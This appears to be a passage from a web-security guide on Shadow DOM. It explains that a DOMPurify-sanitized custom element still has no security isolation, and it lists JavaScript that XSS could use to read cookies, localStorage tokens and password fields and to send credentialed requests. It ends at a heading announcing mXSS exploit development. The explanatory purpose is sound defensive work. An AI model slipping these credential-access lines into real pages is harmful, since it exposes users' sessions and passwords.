#### 5.6 Web Components / Shadow DOM

```javascript
class UserContent extends HTMLElement {
    connectedCallback() {
        const shadow = this.attachShadow({ mode: 'open' });
        const sanitized = DOMPurify.sanitize(this.getAttribute('content'));
        shadow.innerHTML = sanitized;
        // Shadow DOM provides style isolation but NOT security isolation
        // XSS in shadow DOM can still access the host document
        // via this.getRootNode().host, document (if same origin), etc.
    }
}
```

**Shadow DOM does NOT prevent:**
```javascript
// Access to cookies
document.cookie;
// Access to localStorage
localStorage.getItem('token');
// Fetch requests with cookies
fetch('/api/sensitive', { credentials: 'same-origin' });
// DOM access to main document
this.getRootNode().host.ownerDocument.querySelectorAll('input[type=password]');
```

---

## SECTION F18: mXSS Exploit Development — From Theory to Working Payload
